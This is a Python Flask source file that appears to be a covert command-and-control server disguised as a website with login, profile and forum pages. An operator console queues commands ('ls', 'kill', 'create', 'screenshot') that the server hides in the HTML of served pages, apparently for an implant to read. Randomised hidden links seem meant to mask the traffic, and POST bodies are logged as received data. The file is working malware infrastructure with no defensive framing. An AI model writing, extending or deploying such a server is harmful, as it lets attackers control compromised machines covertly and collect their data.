from flask import Flask, render_template, url_for, request, redirect
from threading import Thread
import json
import random
import logging


BOLD = "\033[1m"
RED = "\033[91m"
BLUE = "\033[94m"
END = "\033[0m"


app = Flask(__name__, template_folder="static", static_folder="static")
# log = logging.getLogger("werkzeug")
# log.disabled = True

commands = list()
allowed_commands = ["ls", "kill", "create", "screenshot"]

configs = dict()
with open("config/config.json", "r") as file:
    configs = json.loads(file.read())


def get_command():
    # Call only if there is waiting command(s) else return None
    if len(commands) == 0: return ""
    cmd = commands.pop(0)
    return cmd


def handle_post(request):
    data = request.get_data()
    temp = data.decode("ascii").split("&")
    data = dict()
    for e in temp:
        key, value = e.split("=")
        data[key.lower()] = value
    print(f'{BOLD + RED}Data Received!!\n{BLUE}...{data}{END}')
    return data


def build_links():
    html = '<div class="links" hidden>'
    for url in configs.get("get_dictionary"):
        if random.choice([True, False, True, False, True, False, True]):
            html += f'<a href="{url}">{url.split("/")[-1].upper()}</a>'
    url = random.choice(configs.get("get_dictionary"))
    html += f'<a href="{url}">{url.split("/")[-1].upper()}</a>'
    html += "</div>"
    return html



@app.route("/", methods=["GET"])
@app.route("/home", methods=["GET"])
def home():
    return render_template("home.html", 
                        MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="styles/menubar.css")), 
                        STYLE=url_for('static', filename="styles/base.css"), 
                        COMMANDS= render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else "",
                        LINKS=build_links()
                        )


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        handle_post(request)
        return redirect("/profile", code=302)
    else:
        return render_template("home.html", 
                            MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="styles/menubar.css")), 
                            STYLE=url_for('static', filename="styles/base.css"),
                            COMMANDS=render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else "",
                            ADD=render_template("form.html",
                                CLASS="formLogin",
                                ACTION="/login",
                                CONTENT=render_template("form_input.html", LABEL="Pseudo", TYPE="text") 
                                        + render_template("form_input.html", LABEL="Password", TYPE="password")
                            ),
                            LINKS=build_links()
                        )


@app.route("/signin", methods=["GET", "POST"])
def signin():
    if request.method == "POST":
        handle_post(request)
        return redirect("/profile", code=302)
    return render_template("home.html", 
                            MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="styles/menubar.css")), 
                            STYLE=url_for('static', filename="styles/base.css"),
                            COMMANDS=render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else "",
                            ADD=render_template("form.html",
                                CLASS="formLogin",
                                ACTION="/signin",
                                CONTENT=render_template("form_input.html", LABEL="Pseudo", TYPE="text") 
                                        + render_template("form_input.html", LABEL="Password", TYPE="password")
                                        + render_template("form_input.html", LABEL="Password confirmation", TYPE="password")
                            ),
                            LINKS=build_links()
                        )


@app.route("/profile", methods=["GET"])
@app.route("/profile/<user_id>", methods=["GET"])
def profile():
    return render_template("home.html",
                            MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="styles/menubar.css")), 
                            STYLE=url_for('static', filename="styles/base.css"),
                            COMMANDS=render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else "",
                            ADD=render_template("profile.html", ),
                            LINKS=build_links()
                            )


@app.route("/logout", methods=["GET"])
def logout():
    return redirect("/", code=302)


@app.route("/forum", methods=["GET"])
@app.route("/forum/post", methods=["GET", "POST"])
@app.route("/forum/post/<post_id>", methods=["GET", "POST"])
def test():
    return render_template("home.html", 
                        MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="styles/menubar.css")), 
                        STYLE=url_for('static', filename="styles/base.css"), 
                        COMMANDS= render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else "",
                        LINKS=build_links()
                        )





def start():
    print("Flask server started")
    app.run(host="0.0.0.0")



def operator_interface():
    while True:
        command = input("Enter a command:")
        print(command)
        if len(command.split()) > 0:
            if command.split()[0] in allowed_commands:
                commands.append(command)
                print("Command added to next send")
            elif command == "exit":
                print("Operator interface closed. Press CTRL+C to quit.")
                exit(0)
            else:
                print("Command not recognized")




if __name__ == "__main__":
    server = Thread(target=start)
    interface = Thread(target=operator_interface)
    interface.start()
    server.start()
    server.join()
    interface.join()